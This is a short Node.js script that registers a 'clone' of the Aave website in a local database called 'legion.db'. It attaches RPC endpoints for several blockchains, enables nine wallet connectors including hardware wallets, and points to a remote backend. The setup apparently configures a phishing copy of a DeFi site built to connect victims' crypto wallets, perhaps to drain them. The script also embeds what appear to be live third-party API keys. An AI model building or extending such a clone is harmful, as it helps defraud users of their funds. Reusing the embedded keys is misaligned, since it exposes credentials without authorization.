const Database = require('better-sqlite3');
const path = require('path');

const dbPath = path.join(process.cwd(), 'legion.db');
const db = new Database(dbPath);

const cloneId = `aave-real-${Date.now()}`;
const now = new Date().toISOString();

const addClone = db.prepare(`
  INSERT OR REPLACE INTO clones (id, name, url, domain, port, enableSSL, status, createdAt, lastUpdated)
  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
`);

addClone.run(
  cloneId,
  'aave-clone',
  'https://aave.com',
  'localhost',
  8082,
  0,
  'created',
  now,
  now
);

const addConfig = db.prepare(`
  INSERT OR REPLACE INTO configurations (
    id, cloneId, rpcEvm, rpcSolana, rpcTron, rpcTon, rpcBitcoin,
    walletMetamask, walletCoinbase, walletTrust, walletPhantom,
    walletRabby, walletSolflare, walletConnectEnabled, walletLedger, walletTrezor,
    backendUrl, createdAt, updatedAt
  ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
`);

addConfig.run(
  `config-${cloneId}`,
  cloneId,
  'https://eth-mainnet.g.alchemy.com/v2/LdIrCjy1EiH2RKWDCFpIz',
  'https://mainnet.helius-rpc.com/?api-key=dcac74bd-3b5d-4372-bb5b-c93422dcea5c',
  'https://api.trongrid.io',
  'https://toncenter.com/api/v2/jsonRPC',
  'https://mempool.space/api',
  1, 1, 1, 1, 1, 1, 1, 1, 1,
  'https://legionapi-production.up.railway.app',
  now,
  now
);

console.log(`✅ Created: ${cloneId}`);
db.close();
